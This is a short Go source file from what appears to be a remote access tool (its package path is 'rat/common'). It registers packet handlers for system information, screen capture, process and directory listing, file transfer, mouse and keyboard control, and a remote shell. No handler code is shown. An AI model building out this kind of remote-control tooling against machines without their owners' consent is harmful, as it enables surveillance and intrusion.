package main

import (
	"rat/common"
)

type PacketMap map[common.PacketHeader]IncomingPacket

type Packet struct{}

var packets PacketMap

type OutgoingPacket interface {
	GetHeader() common.PacketHeader
	Write(c *Connection) error
}

type IncomingPacket interface {
	Read(c *Connection) error
}

func init() {
	packets = make(PacketMap)
	packets[common.PingHeader] = Ping{}
	packets[common.SysHeader] = SysPacket{}
	packets[common.ScreenHeader] = ScreenPacket{}
	packets[common.ProcessHeader] = ProcessPacket{}
	packets[common.DirectoryHeader] = DirectoryPacket{}
	packets[common.PutFileHeader] = DownloadPacket{}
	packets[common.GetFileHeader] = UploadPacket{}
	packets[common.MouseMoveHeader] = MouseMovePacket{}
	packets[common.MouseHeader] = MousePacket{}
	packets[common.KeyHeader] = KeyPacket{}
	packets[common.FileHeader] = FilePacket{}
	packets[common.ShellHeader] = ShellPacket{}
}

func GetIncomingPacket(header common.PacketHeader) IncomingPacket {
	return packets[header]
}
